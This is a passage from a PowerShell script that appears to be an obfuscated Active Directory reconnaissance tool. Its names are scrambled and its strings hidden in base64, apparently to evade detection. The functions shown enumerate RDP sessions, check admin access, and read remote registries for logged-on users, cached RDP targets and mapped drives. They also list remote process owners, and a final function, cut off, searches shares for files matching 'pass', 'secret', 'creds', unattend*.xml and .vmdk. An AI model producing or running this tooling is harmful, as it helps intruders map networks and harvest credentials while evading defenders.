                    ${_/\/\___/=\___/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${___/==\/\/==\/=\/}
                }
                ${_/\/\___/=\___/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBOAGEAbQBlAA=='))) ${___/=\_/==\_/\__/}.pSessionName
                if ($(-not ${___/=\_/==\_/\__/}.pDomainName) -or (${___/=\_/==\_/\__/}.pDomainName -eq '')) {
                    ${_/\/\___/=\___/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) "$(${___/=\_/==\_/\__/}.pUserName)"
                }
                else {
                    ${_/\/\___/=\___/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) "$(${___/=\_/==\_/\__/}.pDomainName)\$(${___/=\_/==\_/\__/}.pUserName)"
                }
                ${_/\/\___/=\___/==} | Add-Member Noteproperty 'ID' ${___/=\_/==\_/\__/}.SessionID
                ${_/\/\___/=\___/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdABlAA=='))) ${___/=\_/==\_/\__/}.State
                ${____/==\/\___/===} = [IntPtr]::Zero
                ${/===\____/=\/\___} = 0
                ${/\_______/\/==\__} = ${/===\__/==\__/==\}::WTSQuerySessionInformation(${_/\_/=\__/\/\__/\}, ${___/=\_/==\_/\__/}.SessionID, 14, [ref]${____/==\/\___/===}, [ref]${/===\____/=\/\___});${___/=\__/\/=\__/\} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if(${__/\/\_/\___/=\__} -eq 0) {
                    Write-Verbose "Error: $(([ComponentModel.Win32Exception] ${___/=\__/\/=\__/\}).Message)"
                }
                else {
                    ${__/=====\/\/\_/==} = ${____/==\/\___/===}.ToInt64()
                    ${/==\_/\_/\/\/\/\/} = New-Object System.Intptr -ArgumentList ${__/=====\/\/\_/==}
                    ${_/\/\/\__/\/\/\_/} = ${/==\_/\_/\/\/\/\/} -as ${_/\/\____/===\__/}
                    ${_/==\__/==\/\_/=\} = ${_/\/\/\__/\/\/\_/}.Address       
                    if(${_/==\__/==\/\_/=\}[2] -ne 0) {
                        ${_/==\__/==\/\_/=\} = [String]${_/==\__/==\/\_/=\}[2]+"."+[String]${_/==\__/==\/\_/=\}[3]+"."+[String]${_/==\__/==\/\_/=\}[4]+"."+[String]${_/==\__/==\/\_/=\}[5]
                    }
                    else {
                        ${_/==\__/==\/\_/=\} = $Null
                    }
                    ${_/\/\___/=\___/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUASQBQAA=='))) ${_/==\__/==\/\_/=\}
                    ${_/\/\___/=\___/==}
                    $Null = ${/===\__/==\__/==\}::WTSFreeMemory(${____/==\/\___/===})
                    ${___/\____/====\/=\} += ${/=\_/=\_/\/=\_/\/}
                }
            }
            $Null = ${/===\__/==\__/==\}::WTSFreeMemoryEx(2, ${___/\____/\____/\}, ${_/\/\/=\_/\/=\_/=})
        }
        else {
            Write-Verbose "Error: $(([ComponentModel.Win32Exception] ${____/\/\/=\/\_/\/}).Message)"
        }
        $Null = ${/===\__/==\__/==\}::WTSCloseServer(${_/\_/=\__/\/\__/\})
    }
    else {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAbwBwAGUAbgBpAG4AZwAgAHQAaABlACAAUgBlAG0AbwB0AGUAIABEAGUAcwBrAHQAbwBwACAAUwBlAHMAcwBpAG8AbgAgAEgAbwBzAHQAIAAoAFIARAAgAFMAZQBzAHMAaQBvAG4AIABIAG8AcwB0ACkAIABzAGUAcgB2AGUAcgAgAGYAbwByADoAIAAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlAA==')))
    }
}
filter __/=\___/\_/\/==== {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost'
    )
    ${___/==\/\/==\/=\/} = $ComputerName | _/=\_/=\/=\_/\__/\
    ${_/\_/=\__/\/\__/\} = ${__/==\__/\_/\/\/=}::OpenSCManagerW($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAewBfAF8AXwAvAD0APQBcAC8AXAAvAD0APQBcAC8APQBcAC8AfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBzAEEAYwB0AGkAdgBlAA=='))), 0xF003F);${____/\/\/=\/\_/\/} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBDAGgAZQBjAGsATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwAgAGgAYQBuAGQAbABlADoAIAAkAHsAXwAvAFwAXwAvAD0AXABfAF8ALwBcAC8AXABfAF8ALwBcAH0A')))
    ${_/\_/\/\_/\/\/\__} = New-Object PSObject
    ${_/\_/\/\_/\/\/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${___/==\/\/==\/=\/}
    if (${_/\_/=\__/\/\__/\} -ne 0) {
        $Null = ${__/==\__/\_/\/\/=}::CloseServiceHandle(${_/\_/=\__/\/\__/\})
        ${_/\_/\/\_/\/\/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEEAZABtAGkAbgA='))) $True
    }
    else {
        Write-Verbose "Error: $(([ComponentModel.Win32Exception] ${____/\/\/=\/\_/\/}).Message)"
        ${_/\_/\/\_/\/\/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEEAZABtAGkAbgA='))) $False
    }
    ${_/\_/\/\_/\/\/\__}
}
filter _/==\__/\_/==\_/\_ {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = $Env:ComputerName
    )
    ${___/==\/\/==\/=\/} = $ComputerName | _/=\_/=\/=\_/\__/\
    if(${___/==\/\/==\/=\/} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAD8AOgBbADAALQA5AF0AewAxACwAMwB9AFwALgApAHsAMwB9AFsAMAAtADkAXQB7ADEALAAzAH0AJAA=')))) {
        ${/===\_/\/==\/\/=\} = ${___/==\/\/==\/=\/}
        ${___/==\/\/==\/=\/} = [System.Net.Dns]::GetHostByAddress(${___/==\/\/==\/=\/})
    }
    else {
        ${/===\_/\/==\/\/=\} = @(_/=\/=\/=\_/=\/\_/ -ComputerName ${___/==\/\/==\/=\/})[0].IPAddress
    }
    ${___/\/\/\_/\__/=\} = [IntPtr]::Zero
    ${__/\/\_/\___/=\__} = ${/=\/====\_/\/===\}::DsGetSiteName(${___/==\/\/==\/=\/}, [ref]${___/\/\/\_/\__/=\})
    ${/=\____/====\/\__} = New-Object PSObject
    ${/=\____/====\/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${___/==\/\/==\/=\/}
    ${/=\____/====\/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) ${/===\_/\/==\/\/=\}
    if (${__/\/\_/\___/=\__} -eq 0) {
        $Sitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto(${___/\/\/\_/\__/=\})
        ${/=\____/====\/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA=='))) $Sitename
    }
    else {
        ${___/\_____/===\/\} = "Error: $(([ComponentModel.Win32Exception] ${__/\/\_/\___/=\__}).Message)"
        ${/=\____/====\/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA=='))) ${___/\_____/===\/\}
    }
    $Null = ${/=\/====\_/\/===\}::NetApiBufferFree(${___/\/\/\_/\__/=\})
    ${/=\____/====\/\__}
}
filter Get-LastLoggedOn {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost',
        [Management.Automation.PSCredential]
        $Credential
    )
    ${___/==\/\/==\/=\/} = $ComputerName | _/=\_/=\/=\_/\__/\
    ${_/\____/\__/===\/} = 2147483650
    try {
        if($Credential) {
            ${/==\_/\__/=\/\/\_} = gwmi -List $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Namespace root\default -Computername ${___/==\/\/==\/=\/} -Credential $Credential -ErrorAction SilentlyContinue
        }
        else {
            ${/==\_/\__/=\/\/\_} = gwmi -List $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Namespace root\default -Computername ${___/==\/\/==\/=\/} -ErrorAction SilentlyContinue
        }
        ${_/\_/\/=\_/====\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFwATABvAGcAbwBuAFUASQA=')))
        ${__/====\/\/===\_/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgA=')))
        ${__/==\___/\/=\/=\} = ${/==\_/\__/=\/\/\_}.GetStringValue(${_/\____/\__/===\/}, ${_/\_/\/=\_/====\_}, ${__/====\/\/===\_/\}).sValue
        ${_/=\___/=\/======} = New-Object PSObject
        ${_/=\___/=\/======} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${___/==\/\/==\/=\/}
        ${_/=\___/=\/======} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBnAGUAZABPAG4A'))) ${__/==\___/\/=\/=\}
        ${_/=\___/=\/======}
    }
    catch {
        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABFAHIAcgBvAHIAIABvAHAAZQBuAGkAbgBnACAAcgBlAG0AbwB0AGUAIAByAGUAZwBpAHMAdAByAHkAIABvAG4AIAAkAHsAXwBfAF8ALwA9AD0AXAAvAFwALwA9AD0AXAAvAD0AXAAvAH0ALgAgAFIAZQBtAG8AdABlACAAcgBlAGcAaQBzAHQAcgB5ACAAbABpAGsAZQBsAHkAIABuAG8AdAAgAGUAbgBhAGIAbABlAGQALgA=')))
    }
}
filter Get-CachedRDPConnection {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost',
        [Management.Automation.PSCredential]
        $Credential
    )
    ${___/==\/\/==\/=\/} = $ComputerName | _/=\_/=\/=\_/\__/\
    ${_/===\/\/\______/} = 2147483651
    try {
        if($Credential) {
            ${/==\_/\__/=\/\/\_} = gwmi -List $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Namespace root\default -Computername ${___/==\/\/==\/=\/} -Credential $Credential -ErrorAction SilentlyContinue
        }
        else {
            ${/==\_/\__/=\/\/\_} = gwmi -List $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Namespace root\default -Computername ${___/==\/\/==\/=\/} -ErrorAction SilentlyContinue
        }
        ${/=====\/==\__/\_/} = (${/==\_/\__/=\/\/\_}.EnumKey(${_/===\/\/\______/}, "")).sNames | ? { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) }
        foreach (${_/\____/\/\/=\___} in ${/=====\/==\__/\_/}) {
            try {
                $UserName = __/\_/\_/\__/\/\/\ ${_/\____/\/\/=\___}
                ${_/\/==\/==\_/\/\/} = ${/==\_/\__/=\/\/\_}.EnumValues(${_/===\/\/\______/},$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAF8AXwBfAF8ALwBcAC8AXAAvAD0AXABfAF8AXwB9AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbgB0AFwARABlAGYAYQB1AGwAdAA=')))).sNames
                foreach (${/\_________/\____} in ${_/\/==\/==\_/\/\/}) {
                    if(${/\_________/\____} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBSAFUALgAqAA==')))) {
                        $TargetServer = ${/==\_/\__/=\/\/\_}.GetStringValue(${_/===\/\/\______/}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAF8AXwBfAF8ALwBcAC8AXAAvAD0AXABfAF8AXwB9AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbgB0AFwARABlAGYAYQB1AGwAdAA='))), ${/\_________/\____}).sValue
                        ${__/\__/\/\/\_/\/=} = New-Object PSObject
                        ${__/\__/\/\/\_/\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${___/==\/\/==\/=\/}
                        ${__/\__/\/\/\_/\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $UserName
                        ${__/\__/\/\/\_/\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) ${_/\____/\/\/=\___}
                        ${__/\__/\/\/\_/\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAHIAdgBlAHIA'))) $TargetServer
                        ${__/\__/\/\/\_/\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) $Null
                        ${__/\__/\/\/\_/\/=}
                    }
                }
                ${/=\______/===\__/} = ${/==\_/\__/=\/\/\_}.EnumKey(${_/===\/\/\______/},$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAF8AXwBfAF8ALwBcAC8AXAAvAD0AXABfAF8AXwB9AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbgB0AFwAUwBlAHIAdgBlAHIAcwA=')))).sNames
                foreach (${/====\/\/\_____/\} in ${/=\______/===\__/}) {
                    ${____/====\___/=\_} = ${/==\_/\__/=\/\/\_}.GetStringValue(${_/===\/\/\______/}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAF8AXwBfAF8ALwBcAC8AXAAvAD0AXABfAF8AXwB9AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbgB0AFwAUwBlAHIAdgBlAHIAcwBcACQAewAvAD0APQA9AD0AXAAvAFwALwBcAF8AXwBfAF8AXwAvAFwAfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA')))).sValue
                    ${__/\__/\/\/\_/\/=} = New-Object PSObject
                    ${__/\__/\/\/\_/\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${___/==\/\/==\/=\/}
                    ${__/\__/\/\/\_/\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $UserName
                    ${__/\__/\/\/\_/\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) ${_/\____/\/\/=\___}
                    ${__/\__/\/\/\_/\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAHIAdgBlAHIA'))) ${/====\/\/\_____/\}
                    ${__/\__/\/\/\_/\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) ${____/====\___/=\_}
                    ${__/\__/\/\/\_/\/=}   
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByADoAIAAkAF8A')))
            }
        }
    }
    catch {
        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYQBjAGMAZQBzAHMAaQBuAGcAIAAkAHsAXwBfAF8ALwA9AD0AXAAvAFwALwA9AD0AXAAvAD0AXAAvAH0ALAAgAGwAaQBrAGUAbAB5ACAAaQBuAHMAdQBmAGYAaQBjAGkAZQBuAHQAIABwAGUAcgBtAGkAcwBzAGkAbwBuAHMAIABvAHIAIABmAGkAcgBlAHcAYQBsAGwAIAByAHUAbABlAHMAIABvAG4AIABoAG8AcwB0ADoAIAAkAF8A')))
    }
}
filter Get-RegistryMountedDrive {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost',
        [Management.Automation.PSCredential]
        $Credential
    )
    ${___/==\/\/==\/=\/} = $ComputerName | _/=\_/=\/=\_/\__/\
    ${_/===\/\/\______/} = 2147483651
    try {
        if($Credential) {
            ${/==\_/\__/=\/\/\_} = gwmi -List $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Namespace root\default -Computername ${___/==\/\/==\/=\/} -Credential $Credential -ErrorAction SilentlyContinue
        }
        else {
            ${/==\_/\__/=\/\/\_} = gwmi -List $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Namespace root\default -Computername ${___/==\/\/==\/=\/} -ErrorAction SilentlyContinue
        }
        ${/=====\/==\__/\_/} = (${/==\_/\__/=\/\/\_}.EnumKey(${_/===\/\/\______/}, "")).sNames | ? { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) }
        foreach (${_/\____/\/\/=\___} in ${/=====\/==\__/\_/}) {
            try {
                $UserName = __/\_/\_/\__/\/\/\ ${_/\____/\/\/=\___}
                ${_/=\_/====\/=====} = (${/==\_/\__/=\/\/\_}.EnumKey(${_/===\/\/\______/}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAF8AXwBfAF8ALwBcAC8AXAAvAD0AXABfAF8AXwB9AFwATgBlAHQAdwBvAHIAawA='))))).sNames
                ForEach(${___/\_/==\/==\___} in ${_/=\_/====\/=====}) {
                    ${_/=\/\/\/===\/===} = ${/==\_/\__/=\/\/\_}.GetStringValue(${_/===\/\/\______/}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAF8AXwBfAF8ALwBcAC8AXAAvAD0AXABfAF8AXwB9AFwATgBlAHQAdwBvAHIAawBcACQAewBfAF8AXwAvAFwAXwAvAD0APQBcAC8APQA9AFwAXwBfAF8AfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQByAE4AYQBtAGUA')))).sValue
                    ${/===\__/===\__/\_} = ${/==\_/\__/=\/\/\_}.GetStringValue(${_/===\/\/\______/}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAF8AXwBfAF8ALwBcAC8AXAAvAD0AXABfAF8AXwB9AFwATgBlAHQAdwBvAHIAawBcACQAewBfAF8AXwAvAFwAXwAvAD0APQBcAC8APQA9AFwAXwBfAF8AfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUABhAHQAaAA=')))).sValue
                    ${_/=\/\/===\_/==\/} = ${/==\_/\__/=\/\/\_}.GetStringValue(${_/===\/\/\______/}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAF8AXwBfAF8ALwBcAC8AXAAvAD0AXABfAF8AXwB9AFwATgBlAHQAdwBvAHIAawBcACQAewBfAF8AXwAvAFwAXwAvAD0APQBcAC8APQA9AFwAXwBfAF8AfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA==')))).sValue
                    if(-not $UserName) { $UserName = '' }
                    if(${/===\__/===\__/\_} -and (${/===\__/===\__/\_} -ne '')) {
                        ${/=\/\_/\/\/\__/\/} = New-Object PSObject
                        ${/=\/\_/\/\/\__/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${___/==\/\/==\/=\/}
                        ${/=\/\_/\/\/\__/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $UserName
                        ${/=\/\_/\/\/\__/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) ${_/\____/\/\/=\___}
                        ${/=\/\_/\/\/\__/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAEwAZQB0AHQAZQByAA=='))) ${___/\_/==\/==\___}
                        ${/=\/\_/\/\/\__/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQByAE4AYQBtAGUA'))) ${_/=\/\/\/===\/===}
                        ${/=\/\_/\/\/\__/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUABhAHQAaAA='))) ${/===\__/===\__/\_}
                        ${/=\/\_/\/\/\__/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAFUAcwBlAHIATgBhAG0AZQA='))) ${_/=\/\/===\_/==\/}
                        ${/=\/\_/\/\/\__/\/}
                    }
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByADoAIAAkAF8A')))
            }
        }
    }
    catch {
        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYQBjAGMAZQBzAHMAaQBuAGcAIAAkAHsAXwBfAF8ALwA9AD0AXAAvAFwALwA9AD0AXAAvAD0AXAAvAH0ALAAgAGwAaQBrAGUAbAB5ACAAaQBuAHMAdQBmAGYAaQBjAGkAZQBuAHQAIABwAGUAcgBtAGkAcwBzAGkAbwBuAHMAIABvAHIAIABmAGkAcgBlAHcAYQBsAGwAIAByAHUAbABlAHMAIABvAG4AIABoAG8AcwB0ADoAIAAkAF8A')))
    }
}
filter _/=\_/===\/\/\/=== {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = [System.Net.Dns]::GetHostName(),
        [Management.Automation.PSCredential]
        $Credential
    )
    ${___/==\/\/==\/=\/} = $ComputerName | _/=\_/=\/=\_/\__/\
    try {
        if($Credential) {
            ${/\____/====\/=\_/} = Get-WMIobject -Class Win32_process -ComputerName $ComputerName -Credential $Credential
        }
        else {
            ${/\____/====\/=\_/} = Get-WMIobject -Class Win32_process -ComputerName $ComputerName
        }
        ${/\____/====\/=\_/} | % {
            ${__/\__/\_/=\__/==} = $_.getowner();
            ${_/\__/\/==\__/\/\} = New-Object PSObject
            ${_/\__/\/==\__/\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${___/==\/\/==\/=\/}
            ${_/\__/\/==\__/\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBOAGEAbQBlAA=='))) $_.ProcessName
            ${_/\__/\/==\__/\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQA'))) $_.ProcessID
            ${_/\__/\/==\__/\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) ${__/\__/\_/=\__/==}.Domain
            ${_/\__/\/==\__/\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))) ${__/\__/\_/=\__/==}.User
            ${_/\__/\/==\__/\/\}                
        }
    }
    catch {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABFAHIAcgBvAHIAIABlAG4AdQBtAGUAcgBhAHQAaQBuAGcAIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAZQBzACAAbwBuACAAJAB7AF8AXwBfAC8APQA9AFwALwBcAC8APQA9AFwALwA9AFwALwB9ACwAIABhAGMAYwBlAHMAcwAgAGwAaQBrAGUAbAB5ACAAZABlAG4AaQBlAGQAOgAgACQAXwA=')))
    }
}
function ___/\____/\/==\/\/ {
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Path = '.\',
        [Alias('Terms')]
        [String[]]
        $SearchTerms = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABhAHMAcwA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAG4AcwBpAHQAaQB2AGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAaQBuAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAGMAcgBlAHQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBuAGEAdAB0AGUAbgBkACoALgB4AG0AbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB2AG0AZABrAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAGUAZABzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAGUAZABlAG4AdABpAGEAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBjAG8AbgBmAGkAZwA=')))),
        [Switch]
        $OfficeDocs,
        [Switch]
        $FreshEXEs,
        [String]
        $LastAccessTime,
        [String]
        $LastWriteTime,
        [String]
        $CreationTime,
        [Switch]
        $ExcludeFolders,
        [Switch]
        $ExcludeHidden,
        [Switch]
        $CheckWriteAccess,
        [String]
        $OutFile,
        [Switch]
        $UsePSDrive
    )
    begin {
        $Path += if(!$Path.EndsWith('\')) {"\"}
        if ($Credential) {
            $UsePSDrive = $True
        }
